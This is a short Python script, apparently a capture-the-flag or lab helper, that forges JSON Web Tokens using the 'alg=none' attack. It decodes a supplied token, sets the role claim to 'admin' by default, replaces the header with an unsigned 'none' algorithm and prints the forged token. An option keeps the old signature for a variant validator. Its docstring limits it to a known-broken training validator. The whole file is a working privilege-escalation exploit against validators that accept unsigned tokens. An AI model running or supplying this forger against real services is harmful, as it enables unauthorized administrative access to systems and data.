"""Construct an `alg=none` demo JWT for a known-broken training validator.
Most real validators correctly reject unsigned tokens. Use only in lab.
Run python3 -m tools.recipes.jwt_none --help
"""
import argparse,base64,json

def encode(data):
    compact=json.dumps(data,separators=(',',':')).encode()
    return base64.urlsafe_b64encode(compact).decode().rstrip('=')

def decode_base64url(part):
    return base64.urlsafe_b64decode(part+'='*(-len(part)%4))

def main():
    p=argparse.ArgumentParser(description=__doc__)
    p.add_argument('--token',required=True)
    p.add_argument('--role',default='admin')
    p.add_argument('--retain-signature',action='store_true',help='Older CNS variant retained old signature; use only when challenge says so')
    a=p.parse_args()
    parts=a.token.strip().split('.')
    if len(parts)!=3:p.error('JWT must have three dot-separated sections')
    payload=json.loads(decode_base64url(parts[1]))
    print('Existing claims:',payload)
    payload['role']=a.role
    header={'alg':'none','typ':'JWT'}
    signature=parts[2] if a.retain_signature else ''
    token=encode(header)+'.'+encode(payload)+'.'+signature
    print('Candidate JWT:',token)
if __name__=='__main__':main()
